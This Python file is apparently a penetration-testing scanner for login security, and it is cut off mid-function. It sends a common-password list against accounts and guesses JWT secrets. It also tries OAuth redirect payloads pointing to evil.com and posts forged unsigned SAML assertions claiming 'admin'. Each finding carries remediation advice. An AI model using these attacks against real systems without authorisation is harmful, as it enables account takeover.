#!/usr/bin/env python3
# Copyright (c) 2026 PenTestToolkit
# SPDX-License-Identifier: MIT
"""
AuthSecurityTester - Authentication & Session Security Tester
===============================================================

Tests for:
    - Brute Force vulnerabilities
    - Weak password policies
    - Session fixation
    - Weak session tokens
    - Missing security headers
    - Insecure cookie settings
    - MFA bypass techniques
    - Account enumeration
    - Password reset flaws
    - JWT security issues

Author: Security Research Team
Version: 1.0.0
License: MIT

Usage:
    python auth_security_tester.py -u https://target.com/login
    python auth_security_tester.py -u https://target.com/login -U users.txt -P passwords.txt
    python auth_security_tester.py -u https://target.com --jwt-test

Requirements:
    - Python 3.8+
    - requests, PyJWT
"""

import argparse
import base64
import hashlib
import hmac
import json
import os
import random
import re
import string
import time
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Set, Tuple
from urllib.parse import parse_qs, urlencode, urljoin, urlparse

import requests
import jwt

from common import Colors, detect_waf, add_proxy_arg

urllib3 = requests.packages.urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

VERSION = "1.0.0"

# =============================================================================
# DATA CLASSES
# =============================================================================

@dataclass
class AuthVulnerability:
    name: str
    severity: str
    confidence: str
    url: str
    description: str
    evidence: str
    remediation: str
    cwe: str = ""
    cvss: float = 0.0
    
    def to_dict(self) -> Dict:
        return {
            'name': self.name,
            'severity': self.severity,
            'confidence': self.confidence,
            'url': self.url,
            'description': self.description,
            'evidence': self.evidence,
            'remediation': self.remediation,
            'cwe': self.cwe,
            'cvss': self.cvss
        }

@dataclass
class AuthTestResult:
    target: str
    start_time: str
    end_time: str = ""
    vulnerabilities: List[AuthVulnerability] = field(default_factory=list)
    
    def to_dict(self) -> Dict:
        return {
            'target': self.target,
            'start_time': self.start_time,
            'end_time': self.end_time,
            'summary': {
                'total_vulnerabilities': len(self.vulnerabilities),
                'critical': len([v for v in self.vulnerabilities if v.severity == 'CRITICAL']),
                'high': len([v for v in self.vulnerabilities if v.severity == 'HIGH']),
                'medium': len([v for v in self.vulnerabilities if v.severity == 'MEDIUM']),
                'low': len([v for v in self.vulnerabilities if v.severity == 'LOW']),
            },
            'vulnerabilities': [v.to_dict() for v in self.vulnerabilities]
        }

# =============================================================================
# COMMON CREDENTIALS
# =============================================================================

COMMON_PASSWORDS = [
    "password", "123456", "12345678", "qwerty", "abc123", "monkey", "letmein",
    "dragon", "111111", "baseball", "iloveyou", "trustno1", "sunshine", "princess",
    "admin", "welcome", "shadow", "ashley", "football", "jesus", "michael", "ninja",
    "mustang", "password1", "123456789", "adobe123", "admin123", "letmein1",
    "photoshop", "1234567", "master", "hello", "freedom", "whatever", "qazwsx",
    "trustno1", "password123", "adminadmin", "root", "toor", "guest", "user",
    "test", "test123", "demo", "demo123", "default", "changeme", "password1",
    "Password1", "Passw0rd", "Welcome1", "Welcome123", "Admin123", "Admin@123",
    "P@ssw0rd", "P@$$w0rd", "Login123", "Qwerty123", "Zaq12wsx", "1q2w3e4r",
]

COMMON_USERNAMES = [
    "admin", "administrator", "root", "user", "test", "guest", "demo", "info",
    "mysql", "oracle", "postgres", "webmaster", "support", "service", "manager",
    "operator", "backup", "ftp", "mail", "www", "api", "service", "system",
    "sysadmin", "network", "security", "helpdesk", "webadmin", "siteadmin",
]

# =============================================================================
# AUTHENTICATION TESTER
# =============================================================================

class AuthSecurityTester:
    """Test authentication mechanisms for security flaws."""
    
    def __init__(self, base_url: str, login_path: str = "/login", 
                 username_field: str = "username", password_field: str = "password",
                 output_dir: str = None,
                 test_oauth: bool = True, test_saml: bool = True,
                 test_mfa: bool = True, test_password_policy: bool = True,
                 proxy: Optional[str] = None):
        self.base_url = base_url.rstrip('/')
        self.login_url = urljoin(base_url, login_path)
        self.username_field = username_field
        self.password_field = password_field
        self.output_dir = output_dir or f"auth_test_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        self.test_oauth = test_oauth
        self.test_saml = test_saml
        self.test_mfa = test_mfa
        self.test_password_policy = test_password_policy
        self.proxy = proxy
        
        os.makedirs(self.output_dir, exist_ok=True)
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        if self.proxy:
            self.session.proxies = {'http': self.proxy, 'https': self.proxy}
        
        self.result = AuthTestResult(
            target=base_url,
            start_time=datetime.now().isoformat()
        )
        
        self.vulnerabilities: List[AuthVulnerability] = []
    
    def add_vulnerability(self, vuln: AuthVulnerability):
        """Add a vulnerability finding."""
        self.vulnerabilities.append(vuln)
        color = Colors.RED if vuln.severity == 'CRITICAL' else Colors.YELLOW if vuln.severity == 'HIGH' else Colors.BLUE
        print(f"{color}[{vuln.severity}]{Colors.END} {vuln.name}")
        print(f"     {vuln.description}")
    
    def test_account_enumeration(self) -> None:
        """Test for user account enumeration via error messages."""
        print(f"\n{Colors.CYAN}[*] Testing for account enumeration...{Colors.END}")
        
        # Test with valid username format but non-existent user
        fake_user = "nonexistentuser12345"
        fake_pass = "wrongpassword123"
        
        data = {
            self.username_field: fake_user,
            self.password_field: fake_pass
        }
        
        try:
            response = self.session.post(self.login_url, data=data, timeout=10, verify=False)
            
            # Common enumeration indicators
            invalid_user_indicators = [
                "user not found", "username not found", "account not found",
                "no account", "invalid username", "user does not exist",
                "unknown user", "user name", "doesn't exist", "not registered"
            ]
            
            response_lower = response.text.lower()
            for indicator in invalid_user_indicators:
                if indicator in response_lower:
                    self.add_vulnerability(AuthVulnerability(
                        name="Username Enumeration",
                        severity="MEDIUM",
                        confidence="FIRM",
                        url=self.login_url,
                        description="Application reveals whether username exists through error messages",
                        evidence=f"Indicator found: '{indicator}'",
                        remediation="Use generic error messages for both invalid username and invalid password. Example: 'Invalid credentials'",
                        cwe="CWE-204",
                        cvss=5.3
                    ))
                    return
            
            # Also test with valid-looking username to compare responses
            valid_user = "admin"
            data2 = {
                self.username_field: valid_user,
                self.password_field: fake_pass
            }
            
            response2 = self.session.post(self.login_url, data=data2, timeout=10, verify=False)
            
            # If responses differ significantly, enumeration might be possible
            len_diff = abs(len(response.text) - len(response2.text))
            min_len = min(len(response.text), len(response2.text)) or 1
            if len_diff > max(50, min_len * 0.1):
                self.add_vulnerability(AuthVulnerability(
                    name="Username Enumeration (Response Length)",
                    severity="MEDIUM",
                    confidence="TENTATIVE",
                    url=self.login_url,
                    description="Different response lengths suggest username enumeration possible",
                    evidence=f"Fake user response: {len(response.text)} bytes, Valid user response: {len(response2.text)} bytes",
                    remediation="Ensure consistent response length and timing for both valid and invalid usernames",
                    cwe="CWE-204",
                    cvss=5.3
                ))
                    
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Error testing enumeration: {str(e)}{Colors.END}")
    
    def test_weak_passwords(self, target_username: str = "admin") -> None:
        """Test for weak password usage."""
        print(f"\n{Colors.CYAN}[*] Testing for weak passwords on user: {target_username}...{Colors.END}")
        
        tested = 0
        for password in COMMON_PASSWORDS:
            data = {
                self.username_field: target_username,
                self.password_field: password
            }
            
            try:
                response = self.session.post(self.login_url, data=data, timeout=10, verify=False)
                tested += 1
                
                # Check for successful login indicators
                success_indicators = [
                    "welcome", "dashboard", "profile", "logout", "success", "logged in",
                    "my account", "settings", "admin panel"
                ]
                
                # Get baseline response for comparison
                baseline_response = self.session.get(self.login_url, timeout=10, verify=False)
                baseline_text = baseline_response.text.lower()
                
                # Also check for redirect (common after successful login)
                if response.status_code == 302 or response.is_redirect:
                    redirect_location = response.headers.get('Location', '')
                    # Verify redirect is not to login page or error page
                    if 'login' not in redirect_location.lower() and 'error' not in redirect_location.lower():
                        self.add_vulnerability(AuthVulnerability(
                            name="Weak Password (Brute Force Possible)",
                            severity="CRITICAL",
                            confidence="FIRM",
                            url=self.login_url,
                            description=f"Account '{target_username}' uses weak password: {password}",
                            evidence=f"Redirect after login to: {redirect_location}",
                            remediation="Enforce strong password policy. Implement account lockout after failed attempts. Enable MFA.",
                            cwe="CWE-521",
                            cvss=9.0
                        ))
                        return
                
                response_lower = response.text.lower()
                
                # Compare response to baseline to detect actual login success
                for indicator in success_indicators:
                    # Indicator must be in response but NOT in baseline (login page)
                    if indicator in response_lower and indicator not in baseline_text:
                        # Additional check: response should be different from baseline
                        if abs(len(response.text) - len(baseline_response.text)) > 100:
                            self.add_vulnerability(AuthVulnerability(
                                name="Weak Password (Brute Force Possible)",
                                severity="CRITICAL",
                                confidence="FIRM",
                                url=self.login_url,
                                description=f"Account '{target_username}' uses weak password: {password}",
                                evidence=f"Success indicator found: '{indicator}' (not present on login page)",
                                remediation="Enforce strong password policy. Implement account lockout. Enable MFA.",
                                cwe="CWE-521",
                                cvss=9.0
                            ))
                            return
                
                # Small delay to avoid rate limiting
                time.sleep(0.5)
                
            except Exception as e:
                continue
        
        print(f"{Colors.GREEN}[+] Tested {tested} common passwords - no weak password detected{Colors.END}")
    
    def test_brute_force_protection(self) -> None:
        """Test for brute force protection mechanisms."""
        print(f"\n{Colors.CYAN}[*] Testing for brute force protection...{Colors.END}")
        
        # Send multiple failed login attempts rapidly
        attempts = 20
        fake_user = "testuser_fixed_enum"
        fake_pass = "wrongpass"
        
        responses = []
        timings = []
        
        for i in range(attempts):
            data = {
                self.username_field: fake_user,
                self.password_field: fake_pass
            }
            
            start = time.time()
            try:
                response = self.session.post(self.login_url, data=data, timeout=10, verify=False)
                elapsed = time.time() - start
                
                responses.append(response.status_code)
                timings.append(elapsed)
                
            except Exception as e:
                responses.append(0)
                timings.append(0)
        
        # Check for rate limiting (HTTP 429)
        if 429 in responses:
            print(f"{Colors.GREEN}[+] Rate limiting detected (HTTP 429){Colors.END}")
            return
        
        # Check for account lockout
        if 403 in responses or any(code == 0 for code in responses):
            print(f"{Colors.GREEN}[+] Some form of blocking detected{Colors.END}")
            return
        
        # Check for timing-based throttling
        avg_timing = sum(timings) / len(timings) if timings else 0
        if max(timings) > avg_timing * 2 and max(timings) > 2:
            print(f"{Colors.GREEN}[+] Timing-based throttling detected{Colors.END}")
            return
        
        # No protection detected
        self.add_vulnerability(AuthVulnerability(
            name="Missing Brute Force Protection",
            severity="HIGH",
            confidence="FIRM",
            url=self.login_url,
            description=f"No brute force protection detected after {attempts} rapid failed login attempts",
            evidence=f"All {attempts} attempts returned successful responses without rate limiting or account lockout",
            remediation="Implement account lockout after 3-5 failed attempts. Add CAPTCHA after repeated failures. Enable progressive delays.",
            cwe="CWE-307",
            cvss=8.0
        ))
    
    def test_session_security(self) -> None:
        """Test session cookie security."""
        print(f"\n{Colors.CYAN}[*] Testing session cookie security...{Colors.END}")
        
        # First, get a session by visiting the login page
        try:
            response = self.session.get(self.login_url, timeout=10, verify=False)
        except:
            pass
        
        # Check cookies
        cookies = self.session.cookies.get_dict()
        
        if not cookies:
            print(f"{Colors.YELLOW}[!] No session cookies detected{Colors.END}")
            return
        
        for name, value in cookies.items():
            # Check for session token entropy
            if len(value) < 16:
                self.add_vulnerability(AuthVulnerability(
                    name="Weak Session Token (Insufficient Entropy)",
                    severity="HIGH",
                    confidence="FIRM",
                    url=self.login_url,
                    description=f"Session cookie '{name}' has insufficient entropy ({len(value)} chars)",
                    evidence=f"Cookie value: {value[:20]}...",
                    remediation="Use cryptographically secure random number generator. Minimum 128 bits of entropy.",
                    cwe="CWE-331",
                    cvss=7.5
                ))
            
            # Check for predictable session tokens
            if value.isdigit() or value.isalpha() or re.match(r'^[a-f0-9]+$', value, re.I):
                if len(value) < 32:
                    self.add_vulnerability(AuthVulnerability(
                        name="Predictable Session Token",
                        severity="HIGH",
                        confidence="TENTATIVE",
                        url=self.login_url,
                        description=f"Session cookie '{name}' appears to use simple encoding/pattern",
                        evidence=f"Cookie value appears sequential or simply encoded: {value[:20]}...",
                        remediation="Use cryptographically secure session generation. Avoid simple increments or base encodings.",
                        cwe="CWE-330",
                        cvss=7.0
                    ))
            
            # Check for session fixation: session ID should change after login
            try:
                pre_login_session = requests.Session()
                pre_login_session.headers.update({'User-Agent': 'Mozilla/5.0'})
                if self.proxy:
                    pre_login_session.proxies = {'http': self.proxy, 'https': self.proxy}
                pre_login_session.get(self.login_url, timeout=10, verify=False)
                pre_cookies = pre_login_session.cookies.get_dict()
                
                # Try logging in with a realistic credential
                login_data = {
                    self.username_field: "testuser_fixed_enum",
                    self.password_field: "wrongpass"
                }
                post_login_session = requests.Session()
                post_login_session.headers.update({'User-Agent': 'Mozilla/5.0'})
                if self.proxy:
                    post_login_session.proxies = {'http': self.proxy, 'https': self.proxy}
                post_login_session.post(self.login_url, data=login_data, timeout=10, verify=False)
                post_cookies = post_login_session.cookies.get_dict()
                
                # If session cookie exists and is identical before/after login, that's fixation
                for cookie_name in set(list(pre_cookies.keys()) + list(post_cookies.keys())):
                    if cookie_name in pre_cookies and cookie_name in post_cookies:
                        if pre_cookies[cookie_name] == post_cookies[cookie_name]:
                            self.add_vulnerability(AuthVulnerability(
                                name="Session Fixation",
                                severity="MEDIUM",
                                confidence="FIRM",
                                url=self.login_url,
                                description="Session ID remains the same before and after login attempt",
                                evidence=f"Session cookie '{cookie_name}' unchanged: {pre_cookies[cookie_name][:20]}...",
                                remediation="Regenerate session ID after successful authentication. Invalidate old session.",
                                cwe="CWE-384",
                                cvss=5.9
                            ))
            except Exception:
                pass
    
    def test_cookie_security_flags(self) -> None:
        """Test for secure cookie attributes."""
        print(f"\n{Colors.CYAN}[*] Testing cookie security flags...{Colors.END}")
        
        try:
            response = self.session.get(self.base_url, timeout=10, verify=False)
            cookies = response.cookies
            
            for cookie in cookies:
                # Check HttpOnly flag
                if 'HttpOnly' not in str(cookie).lower():
                    self.add_vulnerability(AuthVulnerability(
                        name="Missing HttpOnly Cookie Flag",
                        severity="MEDIUM",
                        confidence="FIRM",
                        url=self.base_url,
                        description=f"Cookie '{cookie.name}' missing HttpOnly flag",
                        evidence=f"Cookie: {cookie.name}={cookie.value[:20]}...",
                        remediation="Set HttpOnly flag on all session cookies to prevent XSS from accessing them",
                        cwe="CWE-1004",
                        cvss=5.3
                    ))
                
                # Check Secure flag (for HTTPS sites)
                if self.base_url.startswith('https') and 'Secure' not in str(cookie).lower():
                    self.add_vulnerability(AuthVulnerability(
                        name="Missing Secure Cookie Flag",
                        severity="MEDIUM",
                        confidence="FIRM",
                        url=self.base_url,
                        description=f"Cookie '{cookie.name}' missing Secure flag",
                        evidence=f"Cookie: {cookie.name}={cookie.value[:20]}...",
                        remediation="Set Secure flag on all cookies for HTTPS sites to prevent transmission over HTTP",
                        cwe="CWE-614",
                        cvss=5.3
                    ))
                
                # Check SameSite attribute
                if 'samesite' not in str(cookie).lower():
                    self.add_vulnerability(AuthVulnerability(
                        name="Missing SameSite Cookie Attribute",
                        severity="LOW",
                        confidence="FIRM",
                        url=self.base_url,
                        description=f"Cookie '{cookie.name}' missing SameSite attribute",
                        evidence=f"Cookie: {cookie.name}={cookie.value[:20]}...",
                        remediation="Set SameSite=Strict or SameSite=Lax on session cookies to prevent CSRF",
                        cwe="CWE-1275",
                        cvss=3.7
                    ))
                    
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Error checking cookies: {str(e)}{Colors.END}")
    
    def test_security_headers(self) -> None:
        """Test for security headers."""
        print(f"\n{Colors.CYAN}[*] Testing security headers...{Colors.END}")
        
        security_headers = {
            'X-Frame-Options': {
                'severity': 'MEDIUM',
                'description': 'Prevents clickjacking attacks',
                'cwe': 'CWE-1021',
                'cvss': 5.3
            },
            'X-Content-Type-Options': {
                'severity': 'LOW',
                'description': 'Prevents MIME type sniffing',
                'cwe': 'CWE-693',
                'cvss': 3.7
            },
            'X-XSS-Protection': {
                'severity': 'LOW',
                'description': 'Legacy XSS protection',
                'cwe': 'CWE-79',
                'cvss': 3.7
            },
            'Content-Security-Policy': {
                'severity': 'MEDIUM',
                'description': 'Prevents XSS and data injection',
                'cwe': 'CWE-79',
                'cvss': 5.3
            },
            'Strict-Transport-Security': {
                'severity': 'MEDIUM',
                'description': 'Enforces HTTPS',
                'cwe': 'CWE-319',
                'cvss': 5.3
            },
            'Referrer-Policy': {
                'severity': 'LOW',
                'description': 'Controls referrer information',
                'cwe': 'CWE-200',
                'cvss': 3.7
            },
            'Permissions-Policy': {
                'severity': 'LOW',
                'description': 'Restricts browser features',
                'cwe': 'CWE-693',
                'cvss': 3.7
            }
        }
        
        try:
            response = self.session.get(self.base_url, timeout=10, verify=False)
            headers = response.headers
            
            for header, info in security_headers.items():
                if header not in headers:
                    # Special case: HSTS only for HTTPS
                    if header == 'Strict-Transport-Security' and not self.base_url.startswith('https'):
                        continue
                    
                    self.add_vulnerability(AuthVulnerability(
                        name=f"Missing Security Header: {header}",
                        severity=info['severity'],
                        confidence="FIRM",
                        url=self.base_url,
                        description=info['description'],
                        evidence=f"Header '{header}' not found in response",
                        remediation=f"Add '{header}' header to all responses",
                        cwe=info['cwe'],
                        cvss=info['cvss']
                    ))
                    
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Error checking headers: {str(e)}{Colors.END}")
    
    def test_jwt_security(self, jwt_token: str = None) -> None:
        """Test JWT for security issues."""
        print(f"\n{Colors.CYAN}[*] Testing JWT security...{Colors.END}")
        
        if jwt_token:
            tokens = [jwt_token]
        else:
            # Try to find JWT in cookies or local storage
            tokens = []
            try:
                response = self.session.get(self.base_url, timeout=10, verify=False)
                # Check cookies
                for name, value in self.session.cookies.get_dict().items():
                    if len(value) > 50 and '.' in value:
                        try:
                            jwt.decode(value, options={"verify_signature": False})
                            tokens.append(value)
                        except:
                            pass
            except:
                pass
        
        if not tokens:
            print(f"{Colors.YELLOW}[!] No JWT tokens found for testing{Colors.END}")
            return
        
        for token in tokens:
            try:
                # Decode without verification to inspect
                header = jwt.get_unverified_header(token)
                payload = jwt.decode(token, options={"verify_signature": False})
                
                # Check algorithm
                alg = header.get('alg', '').upper()
                
                # Check for 'none' algorithm
                if alg == 'NONE':
                    self.add_vulnerability(AuthVulnerability(
                        name="JWT 'none' Algorithm",
                        severity="CRITICAL",
                        confidence="FIRM",
                        url=self.base_url,
                        description="JWT accepts 'none' algorithm allowing signature bypass",
                        evidence=f"Algorithm: {alg}",
                        remediation="Reject tokens with 'none' algorithm. Explicitly specify allowed algorithms.",
                        cwe="CWE-327",
                        cvss=9.0
                    ))
                
                # Check for weak algorithms
                if alg in ['HS256', 'HS384', 'HS512']:
                    # These are symmetric - check if they're brute forceable
                    pass
                elif alg in ['RS256', 'ES256', 'PS256']:
                    # Asymmetric - good
                    pass
                else:
                    self.add_vulnerability(AuthVulnerability(
                        name="JWT Weak/Unusual Algorithm",
                        severity="HIGH",
                        confidence="TENTATIVE",
                        url=self.base_url,
                        description=f"JWT uses potentially weak algorithm: {alg}",
                        evidence=f"Algorithm: {alg}",
                        remediation="Use strong asymmetric algorithms (RS256, ES256) or ensure strong secrets for symmetric algorithms",
                        cwe="CWE-327",
                        cvss=7.5
                    ))
                
                # Check for expired tokens
                exp = payload.get('exp')
                if exp:
                    if datetime.fromtimestamp(exp) < datetime.now():
                        self.add_vulnerability(AuthVulnerability(
                            name="Expired JWT Token Accepted",
                            severity="MEDIUM",
                            confidence="TENTATIVE",
                            url=self.base_url,
                            description="Application may accept expired JWT tokens",
                            evidence=f"Token expired: {datetime.fromtimestamp(exp)}",
                            remediation="Properly validate 'exp' claim on server side",
                            cwe="CWE-613",
                            cvss=5.9
                        ))
                
                # Check for weak secrets (attempt common secrets)
                if alg in ['HS256', 'HS384', 'HS512']:
                    weak_secrets = ['secret', 'password', '123456', 'key', 'jwt', 'token', 'admin']
                    for secret in weak_secrets:
                        try:
                            jwt.decode(token, secret, algorithms=[alg])
                            self.add_vulnerability(AuthVulnerability(
                                name="JWT Weak Secret",
                                severity="CRITICAL",
                                confidence="FIRM",
                                url=self.base_url,
                                description=f"JWT secret is weak and guessable: '{secret}'",
                                evidence=f"Token verified with secret: {secret}",
                                remediation="Use cryptographically strong random secret (minimum 256 bits)",
                                cwe="CWE-522",
                                cvss=9.0
                            ))
                            break
                        except:
                            pass
                
            except Exception as e:
                print(f"{Colors.YELLOW}[!] Error analyzing JWT: {str(e)}{Colors.END}")
    
    def test_password_reset_flaws(self, reset_url: str = None) -> None:
        """Test password reset functionality for flaws."""
        print(f"\n{Colors.CYAN}[*] Testing password reset security...{Colors.END}")
        
        reset_endpoint = reset_url or urljoin(self.base_url, '/api/auth/forgot-password')
        
        try:
            # Test 1: Check if reset endpoint is reachable
            response = self.session.post(
                reset_endpoint,
                json={"email": "test@test.com"},
                timeout=10,
                verify=False
            )
            
            if response.status_code == 200:
                # Check response for token predictability clues
                try:
                    data = response.json()
                    token = None
                    if isinstance(data, dict):
                        token = data.get('token') or data.get('reset_token') or data.get('code')
                    
                    if token:
                        # Token returned directly in response - security issue
                        self.add_vulnerability(AuthVulnerability(
                            name="Password Reset Token Exposure",
                            severity="HIGH",
                            confidence="FIRM",
                            url=reset_endpoint,
                            description="Password reset token returned directly in API response",
                            evidence=f"Token in response: {token[:30]}...",
                            remediation="Never return reset tokens in API responses. Send via email only.",
                            cwe="CWE-201",
                            cvss=7.5
                        ))
                except (json.JSONDecodeError, TypeError):
                    pass
                
                # Test 2: Check rate limiting on reset requests
                attempts = 10
                codes = []
                for _ in range(attempts):
                    rate_response = self.session.post(
                        reset_endpoint,
                        json={"email": "test@test.com"},
                        timeout=10,
                        verify=False
                    )
                    codes.append(rate_response.status_code)
                
                if 429 not in codes:
                    self.add_vulnerability(AuthVulnerability(
                        name="Password Reset - Missing Rate Limiting",
                        severity="MEDIUM",
                        confidence="TENTATIVE",
                        url=reset_endpoint,
                        description="No rate limiting detected on password reset endpoint",
                        evidence=f"No 429 status after {attempts} rapid requests (codes: {set(codes)})",
                        remediation="Implement rate limiting (e.g., 1 request per 60 seconds per email/IP) on password reset.",
                        cwe="CWE-307",
                        cvss=5.3
                    ))
            elif response.status_code == 429:
                print(f"{Colors.GREEN}[+] Rate limiting present on password reset{Colors.END}")
            else:
                print(f"{Colors.YELLOW}[!] Password reset endpoint returned {response.status_code}{Colors.END}")
                print(f"     Manual testing recommended for deeper analysis")
                
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Error testing password reset: {str(e)}{Colors.END}")
            print(f"     Manual testing required for password reset:")
    
    def test_oauth_flows(self) -> None:
        """Test OAuth 2.0 / OIDC flow security."""
        print(f"\n{Colors.CYAN}[*] Testing OAuth 2.0 / OIDC flows...{Colors.END}")

        oauth_endpoints = [
            '/oauth/authorize', '/oauth/token', '/oauth/revoke',
            '/oauth/userinfo', '/.well-known/openid-configuration',
        ]

        found_endpoints = []
        for endpoint in oauth_endpoints:
            url = urljoin(self.base_url, endpoint)
            try:
                response = self.session.get(url, timeout=10, verify=False)
                if response.status_code != 404:
                    found_endpoints.append(endpoint)
                    print(f"{Colors.GREEN}[+] Found OAuth endpoint: {endpoint}{Colors.END}")
            except:
                pass

        if not found_endpoints:
            print(f"{Colors.YELLOW}[!] No OAuth endpoints discovered{Colors.END}")
            return

        # Test for CSRF in OAuth (missing state parameter)
        for endpoint in found_endpoints:
            if 'authorize' in endpoint:
                try:
                    auth_url = urljoin(self.base_url, endpoint)
                    params = {
                        'client_id': 'test-client',
                        'redirect_uri': urljoin(self.base_url, '/callback'),
                        'response_type': 'code',
                        'scope': 'openid profile'
                    }
                    response = self.session.get(auth_url, params=params, timeout=10, verify=False)
                    if response.status_code == 200 and 'code' in response.text.lower():
                        self.add_vulnerability(AuthVulnerability(
                            name="OAuth CSRF - Missing State Parameter",
                            severity="HIGH",
                            confidence="FIRM",
                            url=auth_url,
                            description="OAuth authorization request does not require 'state' parameter, allowing CSRF attacks",
                            evidence=f"Endpoint {endpoint} accepted request without state parameter",
                            remediation="Always use and validate the 'state' parameter in OAuth flows to prevent CSRF",
                            cwe="CWE-352",
                            cvss=7.5
                        ))
                except Exception:
                    pass

            # Test redirect URI validation bypass
            if 'authorize' in endpoint or 'token' in endpoint:
                try:
                    redirect_url = urljoin(self.base_url, endpoint)
                    open_redirect_payloads = [
                        'https://evil.com/callback',
                        '//evil.com/callback',
                        'https://evil.com@valid.com/callback',
                        '../redirect?url=https://evil.com',
                    ]
                    for payload in open_redirect_payloads:
                        params = {
                            'client_id': 'test-client',
                            'redirect_uri': payload,
                            'response_type': 'code',
                            'scope': 'openid',
                            'state': 'teststate123'
                        }
                        resp = self.session.get(redirect_url, params=params, timeout=10, verify=False, allow_redirects=False)
                        if resp.status_code in (301, 302, 303, 307, 308):
                            loc = resp.headers.get('Location', '')
                            if 'evil' in loc:
                                self.add_vulnerability(AuthVulnerability(
                                    name="OAuth Redirect URI Validation Bypass",
                                    severity="CRITICAL",
                                    confidence="TENTATIVE",
                                    url=redirect_url,
                                    description=f"Potential open redirect in OAuth redirect_uri with payload: {payload}",
                                    evidence=f"Redirect location: {loc}",
                                    remediation="Strictly validate redirect_uri against a whitelist. Reject URIs with different hosts or scheme changes.",
                                    cwe="CWE-601",
                                    cvss=8.0
                                ))
                                break
                except Exception:
                    pass

        # Test token leakage via referrer header
        if '/oauth/authorize' in found_endpoints:
            try:
                external_url = 'https://evil.com/tracker'
                headers = {'Referer': external_url}
                params = {
                    'client_id': 'test-client',
                    'redirect_uri': urljoin(self.base_url, '/callback'),
                    'response_type': 'token',
                    'scope': 'openid',
                    'state': 'teststate'
                }
                resp = self.session.get(
                    urljoin(self.base_url, '/oauth/authorize'),
                    params=params,
                    headers=headers,
                    timeout=10,
                    verify=False
                )
                if resp.status_code == 200:
                    if 'access_token' in resp.text or 'id_token' in resp.text or 'token' in resp.text.lower():
                        self.add_vulnerability(AuthVulnerability(
                            name="OAuth Token Leakage via Referrer",
                            severity="MEDIUM",
                            confidence="TENTATIVE",
                            url=urljoin(self.base_url, '/oauth/authorize'),
                            description="Tokens may be leaked via Referer header when external resources are loaded",
                            evidence="Implicit grant response contains token-like values",
                            remediation="Use the authorization code flow (PKCE) instead of implicit flow. Set Referrer-Policy: no-referrer.",
                            cwe="CWE-200",
                            cvss=5.3
                        ))
            except Exception:
                pass

    def test_saml(self) -> None:
        """Test SAML assertion security."""
        print(f"\n{Colors.CYAN}[*] Testing SAML assertion security...{Colors.END}")

        saml_endpoints = [
            '/saml/acs', '/saml/login', '/saml/metadata',
            '/saml/sso', '/saml/slo', '/saml/sls',
            '/Shibboleth.sso/SAML2/POST', '/Shibboleth.sso/SAML2/Redirect',
        ]

        found_endpoints = []
        for endpoint in saml_endpoints:
            url = urljoin(self.base_url, endpoint)
            try:
                response = self.session.get(url, timeout=10, verify=False)
                if response.status_code != 404:
                    found_endpoints.append(endpoint)
                    print(f"{Colors.GREEN}[+] Found SAML endpoint: {endpoint}{Colors.END}")
            except:
                pass

        if not found_endpoints:
            print(f"{Colors.YELLOW}[!] No SAML endpoints discovered{Colors.END}")
            return

        saml_assertions = [
            {
                'name': 'Empty Issuer',
                'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_test" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
  <saml:Issuer></saml:Issuer>
  <samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>
  <saml:Assertion ID="_assertion1" IssueInstant="2024-01-01T00:00:00Z" Version="2.0">
    <saml:Issuer></saml:Issuer>
    <saml:Subject><saml:NameID>admin</saml:NameID></saml:Subject>
    <saml:Conditions NotBefore="2024-01-01T00:00:00Z" NotOnOrAfter="2099-12-31T23:59:59Z"/>
  </saml:Assertion>
</samlp:Response>''',
            },
            {
                'name': 'Modified Audience',
                'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_test" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
  <saml:Issuer>https://evil.com</saml:Issuer>
  <samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>
  <saml:Assertion ID="_assertion1" IssueInstant="2024-01-01T00:00:00Z" Version="2.0">
    <saml:Issuer>https://evil.com</saml:Issuer>
    <saml:Subject><saml:NameID>admin</saml:NameID></saml:Subject>
    <saml:Conditions NotBefore="2024-01-01T00:00:00Z" NotOnOrAfter="2099-12-31T23:59:59Z"/>
    <saml:AudienceRestriction><saml:Audience>https://evil.com</saml:Audience></saml:AudienceRestriction>
  </saml:Assertion>
</samlp:Response>''',
            },
            {
                'name': 'Missing Signature',
                'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_test" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
  <saml:Issuer>https://valid-idp.com</saml:Issuer>
  <samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>
  <saml:Assertion ID="_assertion1" IssueInstant="2024-01-01T00:00:00Z" Version="2.0">
    <saml:Issuer>https://valid-idp.com</saml:Issuer>
    <saml:Subject><saml:NameID>admin</saml:NameID></saml:Subject>
    <saml:Conditions NotBefore="2024-01-01T00:00:00Z" NotOnOrAfter="2099-12-31T23:59:59Z"/>
  </saml:Assertion>
</samlp:Response>''',
            },
        ]

        for endpoint in found_endpoints:
            for assertion in saml_assertions:
                try:
                    url = urljoin(self.base_url, endpoint)
                    response = self.session.post(
                        url,
                        data={'SAMLResponse': base64.b64encode(assertion['payload'].encode()).decode()},
                        timeout=10,
                        verify=False
                    )
